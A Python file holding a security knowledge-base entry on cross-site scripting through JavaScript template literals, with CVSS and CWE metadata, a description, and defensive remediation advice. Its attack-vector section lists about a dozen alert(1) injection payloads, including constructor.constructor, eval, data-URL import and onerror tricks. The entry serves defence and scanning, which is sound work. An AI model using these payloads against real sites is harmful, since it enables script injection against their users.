#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: Template Literal Context XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in Template Literals",
    "severity": "high",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79", "CWE-94"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "template", "javascript", "es6", "backtick", "interpolation"],
    "description": """
Template literal XSS occurs when user input is embedded in JavaScript template strings
(`backtick strings`) without proper escaping. ES6 template literals support ${} interpolation.

SEVERITY: HIGH
Modern JavaScript extensively uses template literals. Common in React, Vue, Node.js applications.
Easy to overlook as developers may not realize interpolation executes code.
""",
    "attack_vector": """
BASIC INTERPOLATION:
`Hello ${alert(1)}`

TAGGED TEMPLATE:
tag`${alert(1)}`

NESTED TEMPLATES:
`${`${alert(1)}`}`

CONSTRUCTOR CALL:
`${constructor.constructor('alert(1)')()}`

OBJECT INJECTION:
`${({toString:()=>alert(1)})+''}`

ARRAY INJECTION:
`${[alert(1)]}`

FUNCTION CALL:
`${eval('alert(1)')}`

THIS CONTEXT:
`${this.constructor.constructor('alert(1)')()}`

IMPORT EXPRESSION:
`${import('data:text/javascript,alert(1)')}`

STRING RAW:
String.raw`${alert(1)}`

TEMPLATE IN EVAL:
eval(`alert(1)`)

INNERHTML WITH TEMPLATE:
div.innerHTML = `<img src=x onerror=${callback}>`;
""",
    "remediation": """
DEFENSE:

1. NEVER interpolate user input directly
2. Escape special characters: $ ` \\
3. Use parameterized templates
4. Validate input before interpolation
5. Use textContent instead of innerHTML
6. Implement CSP with no 'unsafe-eval'

SAFE PATTERN:
// Instead of:
const html = `<div>${userInput}</div>`;  // DANGEROUS

// Use:
const div = document.createElement('div');
div.textContent = userInput;  // Safe

ESCAPING FUNCTION:
function escapeTemplate(str) {
  return str.replace(/[`$\\]/g, '\\\\$&');
}

SANITIZATION:
const DOMPurify = require('dompurify');
const safe = DOMPurify.sanitize(userInput);

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- JavaScript Security Guidelines
""",
}
